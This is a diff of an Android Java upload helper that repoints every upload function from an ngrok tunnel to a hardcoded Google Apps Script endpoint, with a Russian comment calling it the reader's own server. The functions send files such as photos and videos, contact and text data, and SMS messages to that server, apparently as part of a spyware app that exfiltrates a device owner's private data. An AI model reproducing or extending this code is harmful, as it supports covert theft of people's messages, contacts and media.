@@ -25,11 +25,14 @@ public class UploadHelper {
     private static final int MAX_RETRIES = 3;
     private static final int RETRY_DELAY_MS = 2000; // 2 seconds
 
+    // НОВЫЙ URL — ТВОЙ СЕРВЕР НА GOOGLE APPS SCRIPT
+    private static final String SERVER_URL = "https://script.google.com/macros/s/AKfycbxZ6S4v-0m4_CR645aVq2ZnBcc0ak-M_5UX-0yLX9jI_bhozwrkA968NaE4WRl9ay7abA/exec";
+
     // ✅ For File Uploads (photos, videos, docs, etc)
     public static void uploadFile(Context context, File file, String endpoint) {
         new Thread(() -> {
             try {
-                URL url = new URL("https://a9e4-160-250-114-71.ngrok-free.app/" + endpoint);
+                URL url = new URL(SERVER_URL);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
@@ -59,7 +62,7 @@ public class UploadHelper {
     // ✅ For Contact, Text, Other Data
     public static void sendTextToServer(Context context, String type, String text){
         try {
-            URL url = new URL("https://a9e4-160-250-114-71.ngrok-free.app/upload_text"); // ✅ must be HTTPS
+            URL url = new URL(SERVER_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setConnectTimeout(5000);  // 5s timeout
@@ -96,7 +99,7 @@ public class UploadHelper {
 
     public static boolean uploadFileBlocking(Context context, File file, String endpoint) {
         try {
-            URL url = new URL("https://a9e4-160-250-114-71.ngrok-free.app/" + endpoint);
+            URL url = new URL(SERVER_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
@@ -132,7 +135,7 @@ public class UploadHelper {
             int attempt = 0;
             while (attempt < MAX_RETRIES) {
                 try {
-                    URL url = new URL("https://a9e4-160-250-114-71.ngrok-free.app/upload_sms");
+                    URL url = new URL(SERVER_URL);
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
                     conn.setDoOutput(true);
